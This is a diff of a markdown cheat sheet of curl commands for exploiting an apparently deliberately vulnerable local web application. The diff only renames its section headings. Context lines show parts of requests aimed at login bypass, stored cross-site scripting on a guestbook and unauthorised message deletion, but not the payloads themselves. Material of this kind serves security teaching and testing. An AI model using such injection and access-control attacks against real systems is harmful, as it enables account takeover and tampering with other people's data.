@@ -1,6 +1,6 @@
 A collection of curl commands you can use to exploit the vulnerabilities in the application.
 
-## SQL injection
+## Injection
 
 ```bash
 # Log in as any user
@@ -10,7 +10,7 @@ curl -X POST "http://localhost:8080/api/login" \
   -v && echo ""
 ```
 
-## Cross-site scripting
+## Cross-Site Scripting (XSS)
 
 ```bash
 # Execute a script when the guestbook page is loaded
@@ -21,7 +21,7 @@ curl -X POST "http://localhost:8080/api/messages" \
   -v && echo ""
 ```
 
-## Broken access control
+## Broken Access Control
 
 ```bash
 # Delete any message without admin privileges
